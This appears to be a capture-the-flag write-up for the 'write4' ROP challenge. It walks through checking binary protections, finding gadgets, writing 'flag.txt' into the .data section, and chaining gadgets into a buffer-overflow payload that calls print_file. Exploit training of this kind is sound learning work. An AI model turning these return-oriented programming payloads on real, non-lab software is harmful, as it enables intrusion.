# write4

In this problem, there is a function in shared library named print_file, which will open the file with its argument. The problem here is that this argument, for example "flag.txt" is too long to store in a x86_64 register. Therefore, we need to find some space to store the argument for calling print_file.

First, check the security of the binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

```
Store the argument in stack is impossible because the ASLR in linux, which will make stack, heap address unknown to us.

A straightfoward solution is to store the argument in the data section of the ELF file, then make the print_file to get argument from that address.

Since PIE is disabled, data section address is known for us.   

We can use readelf command to find the address of the data section.
```
...
.data = 0x601028 (dataSect)
...
```
Then, we need to find some rop to help us store the string "flag.txt" to the data section. We can find a gadget with two pop operations pop r1, pop r2, which means that these two registor can be controled by us. Secondly, we need to find a mov operation with the format like mov ptr[r1] [r2], so we can move the value in register r2 to the place we want to store.

Use ROPgadget to find possible gadgets.
```
ROPgadget --binary write4
```
We find two suitable gadgets.
```
...
0x0000000000400690 : pop r14 ; pop r15 ; ret (gadget1)
0x0000000000400628 : mov qword ptr [r14], r15 ; ret (gadget2)
...
```
Firstly, we need to pop the address of data section and string "flag.txt" into r14, r15 by using gadget #pop r14 ; pop r15 ; ret, and then use gadget #mov qword ptr [r14], r15 ; ret to move the string value to the data section.

Next, using ghidra, we know that print_file function obtain argument from rdi register. Therefore, we store the address of data section to rdi using another gadget.

We find a gagdet we need.
```
...
0x0000000000400693 : pop rdi ; ret (gadget3)
...
```
Finally, we can jump to the print_file function address, same as previous problem, we can find print_file address from plt table.
```
peda$ plt
Breakpoint 1 at 0x400510 (print_file@plt)
Breakpoint 2 at 0x400500 (pwnme@plt)
```
Now, we can build our payload, same as problem before, there is a 32 bytes buffer, and 8 bytes rbp.
```
'A'*40
```
Pop the address of data section and string "flag.txt" into r14, r15, and move the string to data section.
```
p64(gadget1) + p64(dataSect) + b"flag.txt" + p64(gadget2)
```
Store the address of data section to register rdi.
```
p64(gadget3) + p64(dataSect)
```
Jump to print_file function.
```
p64(print_file@plt)
```
Write exploit.py using pwntools, and we obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
